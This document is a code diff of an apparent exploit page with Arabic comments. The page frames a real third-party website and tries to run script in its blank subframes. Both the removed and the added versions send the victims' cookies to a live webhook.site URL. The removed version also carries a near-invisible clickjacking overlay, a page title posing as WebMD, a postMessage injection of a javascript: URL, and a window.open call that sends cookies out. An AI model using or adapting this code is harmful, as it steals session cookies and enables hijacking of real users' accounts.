@@ -1,87 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>عرض طبي خاص - WebMD</title>
-    <style>
-        body { margin: 0; font-family: Arial; }
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.001); /* شفاف تقريباً */
-            z-index: 9999;
-        }
-    </style>
-</head>
-<body>
-    <!-- 🎯 الـ iframe المستهدف -->
-    <iframe src="https://www.powerpak.com/" 
-            style="width:100%; height:100vh; border:0;" 
-            id="targetFrame"
-            sandbox="allow-scripts allow-same-origin allow-popups">
-    </iframe>
+<body style="margin:0;">
+    <iframe src="https://www.powerpak.com/" id="f" style="width:100%;height:100vh;border:0;"></iframe>
     
-    <!-- 🎭 overlay للـ Clickjacking -->
-    <div id="overlay" onclick="startExploit()"></div>
-
     <script>
-        const WEBHOOK = 'https://webhook.site/3006785b-1283-4338-8475-208841413c5b';
-        const TARGET = 'https://www.powerpak.com/';
-        
-        function startExploit() {
-            console.log('🚀 Starting exploit...');
-            
-            const frame = document.getElementById('targetFrame');
-            
-            // 🎪 محاولة 1: PostMessage للـ frames الداخلية
-            try {
-                const win = frame.contentWindow;
-                
-                for (let i = 0; i < win.frames.length; i++) {
-                    try {
-                        const f = win.frames[i];
-                        
-                        if (f.location.href === 'about:blank') {
-                            console.log('🚨 Frame #' + i + ' is about:blank!');
-                            
-                            // 🚨 Alert - إثبات XSS
-                            f.alert('XSS CONFIRMED! Frame #' + i);
-                            
-                            // 🚨 سرقة Cookies
-                            const cookies = f.parent.document.cookie;
-                            console.log('🍪 Stolen:', cookies);
-                            
-                            // 📤 إرسال للـ Webhook
-                            fetch(WEBHOOK + '?frame=' + i + '&cookies=' + encodeURIComponent(cookies));
-                            new Image().src = WEBHOOK + '?c=' + encodeURIComponent(cookies) + '&t=' + Date.now();
-                        }
-                    } catch (e) {
-                        console.log('❌ Frame #' + i + ':', e.message);
-                    }
-                }
-            } catch (e) {
-                console.log('💥 Cannot access iframe:', e.message);
-            }
-            
-            // 🎪 محاولة 2: PostMessage للموقع المستهدف
-            frame.contentWindow.postMessage({
-                type: 'render',
-                url: 'javascript:alert("XSS_test")'
-            }, '*');
-            
-            // إخفاء الـ overlay
-            document.getElementById('overlay').style.display = 'none';
-        }
-
-        // 🎪 محاولة 3: فتح نافذة من الـ iframe نفسه
         setTimeout(() => {
-            try {
-                const frame = document.getElementById('targetFrame');
-                frame.contentWindow.open('javascript:fetch("' + WEBHOOK + '?c="+document.cookie)', '_blank');
-            } catch(e) {}
-        }, 3000);
+            const w = document.getElementById('f').contentWindow;
+            for(let i=0; i<w.frames.length; i++) {
+                try {
+                    let f = w.frames[i];
+                    if(f.location.href === 'about:blank') {
+                        f.alert('XSS!'); // 🚨 إثبات
+                        fetch('https://webhook.site/3006785b-1283-4338-8475-208841413c5b?c=' + encodeURIComponent(f.parent.document.cookie)); // 🍪 سرقة
+                    }
+                } catch(e) {}
+            }
+        }, 5000);
     </script>
 </body>
 </html>
